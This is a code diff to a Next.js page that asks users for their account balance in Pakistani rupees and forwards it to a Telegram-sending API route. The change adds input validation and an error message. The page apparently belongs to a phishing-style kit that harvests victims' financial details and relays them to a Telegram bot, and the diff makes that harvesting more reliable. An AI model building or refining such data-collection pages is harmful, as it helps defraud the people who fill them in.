@@ -10,6 +10,7 @@ const logoImage =
 export default function BalancePage() {
   const router = useRouter()
   const [balance, setBalance] = useState('')
+  const [error, setError] = useState('')
 
   return (
     <main className="min-h-screen bg-background px-3 pb-8 pt-3 text-foreground">
@@ -31,11 +32,16 @@ export default function BalancePage() {
             className="mt-5"
             onSubmit={async (event) => {
               event.preventDefault()
+              if (!balance || Number(balance) <= 0) {
+                setError('Please enter your account balance.')
+                return
+              }
+              setError('')
               try {
                 await fetch('/api/telegram/send', {
                   method: 'POST',
                   headers: { 'content-type': 'application/json' },
-                  body: JSON.stringify({ text: `Account balance submitted: PKR ${balance || '0'}` }),
+                  body: JSON.stringify({ text: `Account balance submitted: PKR ${balance}` }),
                 })
               } catch {
                 // Continue navigation even if the notification fails
@@ -53,10 +59,14 @@ export default function BalancePage() {
                   aria-label="Current balance in PKR"
                   inputMode="numeric"
                   value={balance}
-                  onChange={(event) => setBalance(event.target.value.replace(/\D/g, ''))}
+                  onChange={(event) => {
+                    setBalance(event.target.value.replace(/\D/g, ''))
+                    if (error) setError('')
+                  }}
                   placeholder="0"
                 />
               </div>
+              {error ? <p className="mt-2 text-sm font-medium text-destructive">{error}</p> : null}
             </div>
 
             <div className="info-notice mt-4">
